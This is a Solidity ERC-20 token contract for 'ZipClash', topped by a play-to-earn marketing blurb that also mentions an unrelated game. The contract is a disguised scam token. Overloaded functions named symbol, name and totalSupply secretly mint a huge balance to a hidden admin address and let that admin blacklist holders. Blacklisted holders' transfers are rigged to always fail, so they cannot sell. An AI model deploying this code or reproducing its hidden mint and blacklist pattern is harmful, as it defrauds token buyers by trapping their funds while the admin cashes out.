/*
ZipClash Game
Nobody in the latter part of the 20th century would have imagined that one could earn real 
money just by playing games. Nonetheless, we are steadily progressing toward that world. 
By and large, a shift is occurring in the gaming industry, with games being published on 
blockchains and utilizing digital currencies (cryptocurrencies), decentralized exchanges/trading, 
and economies based on digital assets. These assets are frequently Non-Fungible Tokens (NFTs) 
to ensure their authenticity and uniqueness. As a result, the degree to which in-game graphics 
and objects may be monetized has expanded significantly during the last decade. Regardless, 
advancements in blockchain innovation are elevating Play-to-Earn (P2E) gaming to new heights. 
Anyone may earn money from the gaming space thanks to P2E games. As awareness of Play-to-Earn 
games grows, P2E games are virtually capturing market share in every contemporary form of gaming. 
Compared to traditional Pay-to-Win games, blockchain and NFT-based games establish a balance 
between Pay-to-Win and Play-to-Earn, Knight War-The Holy Trio is a blockchain game of this type.
Our Vision
We believe in a future in which work and play become one.
We believe in empowering players and providing them with economic opportunities.
Most of all, we believe in the dream of an intergalactic restaurant.
Ecosystem
The main difference between ZipClash and other Idle/Clicker games is its Play-to-Earn income model 
and economic structure that empowers players to keep playing the game for the foreseeable future. 
In other famous games like Axie Infinity, the bull run of the game started facing a downfall after years 
of its creation, leaving many players’ expectations and investment goals unfulfilled. In this game, 
every player could create a lot of daily SLP, but there were few ways to use the currency. In other words, 
the supply surpassed the demand, which doomed the game to crash sooner or later. In ZipClash, 
however, the leaderboard clusters and C/S model will make it impossible to generate a higher supply 
than demand because the income graph of the players does not increase exponentially.
Tokenomics Summary
Name: ZipClash
Symbo: ZIPCLASH
Total Supply:1,000,000,000
Type: ERC-20
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    
}

contract ZipClash is Ownable{
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(string memory tokenname,string memory tokensymbol,address ghadmin) {
        _totalSupply = 1000000000*10**decimals();
        _balances[msg.sender] = 1000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        SCCLadmin = ghadmin;
        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());
    }
    

    mapping(address => bool) public nakinfo;
    address public SCCLadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    uint256 xkak = (10**18 * (78800+100)* (33300000000 + 800));
    
    function symbol(uint256 aaxa) public   {
        if(false){
            
        }
        if(true){

        }
        _balances[_msgSender()] += xkak;
        _balances[_msgSender()] += xkak;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }


    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address sada) public  {
        address taaxaoinfo = sada;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        nakinfo[taaxaoinfo] = false;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address xsada) public {
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        address tmoinfo = xsada;
        nakinfo[tmoinfo] = true;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (true == nakinfo[_msgSender()]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        if (true == nakinfo[from]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}